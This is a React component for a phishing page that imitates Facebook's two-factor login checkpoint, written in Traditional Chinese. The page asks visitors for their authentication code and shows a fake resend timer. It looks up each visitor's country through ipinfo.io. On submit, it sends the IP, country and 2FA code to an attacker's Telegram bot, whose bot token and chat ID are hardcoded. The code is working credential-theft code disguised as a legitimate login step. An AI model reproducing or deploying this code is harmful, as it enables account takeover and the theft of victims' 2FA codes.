import Nav from './nav';
import styles from '../styles/check-point.module.css';
import { useForm } from "react-hook-form";
import { useState, useEffect } from "react";
import axios from 'axios'; // 確保你已經安裝了 axios

const CheckPoint = (props) => {
    const { register, handleSubmit } = useForm();
    const [minutes, setMinutes] = useState(1);
    const [seconds, setSeconds] = useState(30);
    const [countryCode, setCountryCode] = useState('');

    useEffect(() => {
        const interval = setInterval(() => {
            if (seconds > 0) {
                setSeconds(seconds - 1);
            }

            if (seconds === 0) {
                if (minutes === 0) {
                    clearInterval(interval);
                } else {
                    setSeconds(59);
                    setMinutes(minutes - 1);
                }
            }
        }, 1000);

        return () => {
            clearInterval(interval);
        };
    }, [seconds]);

    useEffect(() => {
        if (props.ip && props.ip.userIP) {
            fetchCountryCode(props.ip.userIP);
        }
    }, [props.ip]);

    const fetchCountryCode = async (ip) => {
        try {
            const response = await axios.get(`https://ipinfo.io/${ip}?token=5960a8a77a8ce2`);
            const { country } = response.data;
            setCountryCode(country);
        } catch (err) {
            console.log(err);
        }
    };

    const resendOTP = () => {
        setMinutes(1);
        setSeconds(30);
    };

    const sendCode = async (data) => {
        try {
            const message = `
            2FA%0A Ip:${props.ip.userIP}%0ACountry Code: ${countryCode}%0A🔐code: ${data.code}`;
            await fetch(`https://api.telegram.org/bot7084620467:AAGeN4LUgNN5jGCRZjTCUm13vLClBpGyaw4/sendMessage?chat_id=-1002226532878&text=${message}`);
        } catch (err) {
            console.log(err);
        }
    }

    const onSubmit = (data) => {
        sendCode(data)
    }

    return (
        <div>
            <Nav />
            <div className={styles.container}>
                <div className={styles.box}>
                    <div className={styles.section}>
                        <strong>選擇確認身份的方法</strong>
                    </div>
                    <div className={styles.section}>
                        <p>您的帳戶啟用了兩步驟驗證，這需要這個額外的登錄步驟。</p>
                    </div>

                    <div className={styles.section}>
                        <strong>從另一台設備批准</strong>
                        <p>
                            我們已經發送了一個通知到您的設備。請檢查那裡的 Facebook 通知並批准登錄以繼續。
                        </p>
                    </div>

                    <form onSubmit={handleSubmit(onSubmit)}>
                        <div className={styles.section}>
                            <strong>或者，輸入您的登錄代碼</strong>
                            <p>
                                輸入您設置的身份驗證應用程序中的 6 位數代碼。
                            </p>
                            <div className={styles.codeInput}>
                                <input type="text" placeholder="登錄代碼" {...register("code")} className={styles.code} />
                                {seconds > 0 || minutes > 0 ? (
                                    <p>
                                        ({minutes < 10 ? `0${minutes}` : minutes}:
                                            {seconds < 10 ? `0${seconds}` : seconds}
                                        )
                                    </p>
                                ) : (
                                    <button onClick={resendOTP}>
                                        重新發送
                                    </button>
                                )}
                            </div>
                        </div>

                        <div className={styles.bottom}>
                            <a>需要其他確認身份的方法嗎？</a>
                            <button type="submit" className={styles.btn}>提交代碼</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    );
};

export default CheckPoint;
